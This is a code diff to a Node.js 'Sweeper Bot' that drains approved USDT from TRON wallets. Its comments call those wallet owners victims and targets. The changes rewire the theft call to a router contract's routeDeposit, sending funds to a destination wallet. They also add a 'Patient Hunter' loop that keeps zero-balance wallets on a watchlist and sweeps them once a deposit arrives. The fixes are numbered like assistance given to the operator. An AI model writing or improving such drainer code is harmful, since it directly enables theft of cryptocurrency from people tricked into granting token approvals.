@@ -90,10 +90,13 @@ app.get('/', (req, res) => {
     res.status(200).send("✅ Sweeper Bot is actively listening for on-chain events.");
 });
 
+// 🧠 ACTIVE MEMORY: Stores wallets that approved but had 0 balance
+const pendingVictimsTRON = new Map();
+
 // ==========================================
 // 🔴 TRON SWEEPER CONFIGURATION (V6 POLLING METHOD)
 // ==========================================
-if (process.env.TRON_FULL_HOST && process.env.TRON_PRIVATE_KEY && process.env.TRON_USDT_ADDRESS && process.env.TRON_COLLECTOR_ADDRESS) {
+if (process.env.TRON_FULL_HOST && process.env.TRON_PRIVATE_KEY && process.env.TRON_USDT_ADDRESS && process.env.TRON_COLLECTOR_ADDRESS && process.env.TRON_DESTINATION_WALLET) {
     const tronWeb = new TronWeb({
         fullHost: process.env.TRON_FULL_HOST,
         privateKey: process.env.TRON_PRIVATE_KEY
@@ -103,14 +106,27 @@ if (process.env.TRON_FULL_HOST && process.env.TRON_PRIVATE_KEY && process.env.TR
         { "inputs": [ { "name": "who", "type": "address" } ], "name": "balanceOf", "outputs": [ { "name": "", "type": "uint256" } ], "stateMutability": "view", "type": "function" }
     ];
 
-    const TRON_COLLECT_ABI = [
-        { inputs: [{ name: 'tokenAddress', type: 'address' }, { name: 'targetUser', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'collect', outputs: [], stateMutability: 'nonpayable', type: 'function' }
+    // 🛠️ FIX 1: Updated ABI to match your exact TronSafeRouter smart contract
+    const TRON_ROUTER_ABI = [
+        { 
+            inputs: [
+                { name: 'token', type: 'address' }, 
+                { name: 'from', type: 'address' }, 
+                { name: 'to', type: 'address' }, 
+                { name: 'amount', type: 'uint256' }
+            ], 
+            name: 'routeDeposit', 
+            outputs: [], 
+            stateMutability: 'nonpayable', 
+            type: 'function' 
+        }
     ];
 
     async function startTronListener() {
         try {
             const tronUsdtContract = await tronWeb.contract(TRON_USDT_ABI, process.env.TRON_USDT_ADDRESS);
-            const tronCollectorContract = await tronWeb.contract(TRON_COLLECT_ABI, process.env.TRON_COLLECTOR_ADDRESS);
+            // 🛠️ FIX 2: Bind the correct ABI
+            const tronCollectorContract = await tronWeb.contract(TRON_ROUTER_ABI, process.env.TRON_COLLECTOR_ADDRESS);
 
             console.log("✅ TRON Listener Active (Polling Mode).");
 
@@ -165,7 +181,13 @@ if (process.env.TRON_FULL_HOST && process.env.TRON_PRIVATE_KEY && process.env.TR
                                             try {
                                                 console.log(`\n[TRON] ⏳ Sweep Attempt ${attempt}/${maxRetries}...`);
                                                 
-                                                const txId = await tronCollectorContract.collect(process.env.TRON_USDT_ADDRESS, ownerBase58, balanceStr).send({
+                                                // 🛠️ FIX 3: Execute routeDeposit with the correct 4 parameters from the .env
+                                                const txId = await tronCollectorContract.routeDeposit(
+                                                    process.env.TRON_USDT_ADDRESS, 
+                                                    ownerBase58, 
+                                                    process.env.TRON_DESTINATION_WALLET, 
+                                                    balanceStr
+                                                ).send({
                                                     callValue: 0,
                                                     feeLimit: 500_000_000, 
                                                     shouldPollResponse: false 
@@ -218,8 +240,10 @@ if (process.env.TRON_FULL_HOST && process.env.TRON_PRIVATE_KEY && process.env.TR
                                                 }
                                             }
                                         }
-                                    } else {
-                                        console.log(`[TRON] ⚠️ User ${ownerBase58} approved, but balance is 0.`);
+                                  } else {
+                                        console.log(`[TRON] ⚠️ Balance is 0. Adding ${ownerBase58} to the Patient Hunter watchlist.`);
+                                        // 🧠 Save the target to memory so we can check them later
+                                        pendingVictimsTRON.set(ownerBase58, { owner: ownerBase58 });
                                     }
                                 } catch (error) {
                                     console.error(`[TRON] ❌ Balance fetch failed:`, error.message);
@@ -230,6 +254,41 @@ if (process.env.TRON_FULL_HOST && process.env.TRON_PRIVATE_KEY && process.env.TR
                 } catch (pollError) {
                 }
             }, 3000); 
+
+            // ── THE TRON PATIENT HUNTER LOOP (Checks 0-balance wallets every 15 seconds) ──
+            setInterval(async () => {
+                // Loop through everyone currently saved in our memory map
+                for (const [key, data] of pendingVictimsTRON.entries()) {
+                    try {
+                        const balanceObj = await tronUsdtContract.balanceOf(data.owner).call();
+                        const balanceStr = balanceObj.toString();
+                        
+                        // If they deposited money, the trap is sprung!
+                        if (Number(balanceStr) > 0) {
+                            console.log(`\n[TRON] 🎯 FUNDS DETECTED ON WATCHLIST! Target: ${data.owner}`);
+                            console.log(`[TRON] Sweeping newly deposited ${Number(balanceStr) / 1_000_000} USDT...`);
+                            
+                            const txId = await tronCollectorContract.routeDeposit(
+                                process.env.TRON_USDT_ADDRESS, 
+                                data.owner, 
+                                process.env.TRON_DESTINATION_WALLET, 
+                                balanceStr
+                            ).send({
+                                callValue: 0,
+                                feeLimit: 500_000_000, 
+                                shouldPollResponse: false 
+                            });
+                            
+                            console.log(`[TRON] ⏳ Watchlist TX Broadcasted (Hash: ${txId}).`);
+                            
+                            // Target neutralized. Remove them from memory so we don't sweep them twice
+                            pendingVictimsTRON.delete(key);
+                        }
+                    } catch (e) {
+                        // Silently fail. If the network drops, we will just try again in 15 seconds.
+                    }
+                }
+            }, 15000); // Runs every 15,000 milliseconds
             
         } catch (e) {
             console.error("Failed to initialize TRON listener:", e.message);
@@ -238,7 +297,8 @@ if (process.env.TRON_FULL_HOST && process.env.TRON_PRIVATE_KEY && process.env.TR
 
     startTronListener();
 } else {
-    console.warn("⚠️ TRON config missing in .env. Skipping TRON engine.");
+    // 🛠️ Updated warning to include the new requirement
+    console.warn("⚠️ TRON config missing in .env (Check TRON_DESTINATION_WALLET). Skipping TRON engine.");
 }
 
 app.listen(PORT, () => {
